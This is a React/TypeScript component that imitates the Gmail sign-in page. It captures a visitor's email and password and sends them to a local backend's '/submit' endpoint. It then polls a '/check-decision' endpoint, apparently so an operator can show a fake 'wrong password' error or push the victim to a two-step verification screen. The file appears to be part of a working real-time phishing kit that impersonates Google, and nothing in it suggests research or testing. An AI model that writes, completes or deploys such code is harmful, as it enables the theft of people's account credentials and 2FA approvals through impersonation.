import { useState } from "react";
import BrandingSide from "./BrandingSide";
import EmailForm from "./EmailForm";
import PasswordForm from "./PasswordForm";
import Footer from "./Footer";
import "./GmailLogin.css";
import TwoStepVerification from "./TwoStepVerification";

const GmailLogin = () => {
    const [showPassword, setShowPassword] = useState(false);
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState(""); // lifted up from PasswordForm
    const [passwordError, setPasswordError] = useState("");
    const [show2FA, setShow2FA] = useState(false);


    const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();
        if (email.trim()) {
            setShowPassword(true);
        } else {
            alert("Please enter your email or phone");
        }
    };

    const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        setPasswordError(""); // clear any previous error

        await fetch("http://localhost:8080/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email, password, provider: "GMAIL" }),
        });

        const interval = setInterval(async () => {
            const res = await fetch("http://localhost:8080/check-decision");
            console.log(res.status);
            const data = await res.json();

            if (data.decision === "password-error") {
                clearInterval(interval);
                setPasswordError("Wrong password. Try again."); // stays on password screen
                setPassword(""); // clear the password field
            } if (data.decision === "yes-prompt") {
                console.log("decision is {}", data);
                clearInterval(interval);
                setShow2FA(true); // show the 2FA screen
            }
        }, 2000);
    };

    if (show2FA) {
        return <TwoStepVerification email={email} />;
    }

    return (
        <div className="gmail-login-page">
            <div className="login-card">
                <BrandingSide showPassword={showPassword} email={email} />

                <div className="form-side">
                    {!showPassword ? (
                        <EmailForm email={email} onEmailChange={setEmail} onNext={handleNext} />
                    ) : (
                        <PasswordForm
                            password={password}
                            onPasswordChange={setPassword}
                            onSubmit={handleSubmit}
                            error={passwordError}
                        />
                    )}
                </div>
            </div>

            <Footer />
        </div>
    );
};

export default GmailLogin;